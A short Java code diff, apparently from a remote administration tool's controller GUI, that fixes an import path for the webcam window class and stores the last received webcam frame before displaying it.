@@ -3,7 +3,7 @@ package Connections;
 import GUI.Main;
 import GUI.TableUtils.FileManager.FileManagerGUI;
 import GUI.TableUtils.ScreenStreaming.ScreenStreamingGUI;
-import GUI.TableUtils.Webcam.WebcamManager.WebcamGUI;
+import GUI.TableUtils.WebcamManager.WebcamGUI;
 import Information.NetworkInformation;
 import Information.SystemInformation;
 import org.json.JSONArray;
@@ -172,6 +172,7 @@ public class Updater {
     }
 
     void updateFrameOfWebcamStreamer(byte[] data) {
+        webcamGUI.setLastFrame(data);
         SwingUtilities.invokeLater(() -> {
             ImageIcon tempIMG = new ImageIcon(data);
             webcamGUI.getWebcamLabel().setIcon(tempIMG);
